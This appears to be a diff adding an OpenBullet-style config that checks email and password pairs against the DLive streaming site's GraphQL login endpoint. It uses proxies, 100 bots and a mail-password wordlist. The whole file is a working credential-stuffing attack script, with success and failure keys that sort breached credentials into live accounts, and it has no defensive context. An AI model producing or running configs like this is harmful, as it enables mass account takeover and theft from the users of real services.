@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "dlive",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-08T23:17:17.1670656+02:00",
+  "AdditionalInfo": "",
+  "Author": "Brian",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://graphigo.prd.dlive.tv/" 
+  CONTENT "{\"operationName\":\"EmailLogin\",\"variables\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"eb394fb0ab58013d3d97d363fba204a28b36fef33b98bdf36f15f0916ae85b3b\"}}}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://dlive.tv" 
+  HEADER "Referer: https://dlive.tv/" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"data\":{\"loginWithEmail\":{\"me\":{\"id\":\"user:" 
+  KEYCHAIN Failure OR 
+    KEY "code\":1403,\"message" 
+
